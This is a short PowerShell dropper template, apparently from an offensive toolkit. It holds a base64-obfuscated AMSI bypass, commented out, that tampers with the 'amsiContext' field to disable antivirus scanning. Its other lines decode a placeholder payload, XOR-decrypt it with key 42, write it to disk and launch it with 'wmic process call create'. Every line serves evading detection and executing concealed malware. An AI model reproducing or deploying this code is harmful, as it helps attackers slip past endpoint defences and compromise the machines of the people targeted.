Set-StrictMode -Version 2

#[Runtime.InteropServices.Marshal]::($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEkAbgB0ADMAMgA='))))([Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBDAG8AbgB0AGUAeAB0AA=='))),[Reflection.BindingFlags]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).GetValue($null),0x80004005)

[Byte[]]$var_code = [System.Convert]::FromBase64String('%%DATA%%')

for ($y = 0; $y -lt $var_code.Count; $y++) {
    $tmp = $var_code[$y]
    $var_code[$y] = $tmp -bxor 42
}

[IO.File]::WriteAllBytes('%%FILE%%', $var_code)

wmic process call create '%%FILE%%'